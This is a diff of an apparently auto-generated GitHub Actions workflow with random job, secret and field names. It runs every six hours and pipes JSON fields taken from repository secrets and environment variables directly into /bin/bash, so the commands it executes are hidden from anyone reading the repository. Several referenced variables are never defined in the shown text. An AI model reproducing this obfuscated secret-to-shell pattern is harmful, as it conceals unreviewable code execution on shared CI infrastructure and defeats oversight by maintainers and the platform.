@@ -3,7 +3,7 @@ name: weidiyi9182
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
+    - cron: '57 1/6 * * *'
 
 jobs:
   build:
@@ -12,17 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: weidiyi9182
         env:
-          yjvot0: ${{ secrets.yjvot0 }}
+          wyk8: ${{ secrets.wyk8 }}
         run: |
-          echo $yjvot0 | jq -r .mjer9418 | /bin/bash
-          echo $wmchh1765 | jq -r .uvjo5499 | /bin/bash
-          echo $d59 | jq -r .ippla64 | /bin/bash
-          echo $swu4325 | jq -r .jy94108 | /bin/bash
-          echo $kek92720 | jq -r .g767 | /bin/bash
-          echo $uhydt5248 | jq -r .c6 | /bin/bash
-          echo $xmyki32753 | jq -r .okcr0508 | /bin/bash
-          echo $lhy499 | jq -r .oy577 | /bin/bash
-          echo $b20518 | jq -r .t09 | /bin/bash
-          echo $jbzsc99931 | jq -r .pv59 | /bin/bash
-          echo $l170 | jq -r .ccpo06605 | /bin/bash
+          echo $wyk8 | jq -r .xli5 | /bin/bash
+          echo $gdw792 | jq -r .kh20 | /bin/bash
+          echo $htnc62539 | jq -r .oyj180 | /bin/bash
+          echo $jwrrn96 | jq -r .yav9 | /bin/bash
 
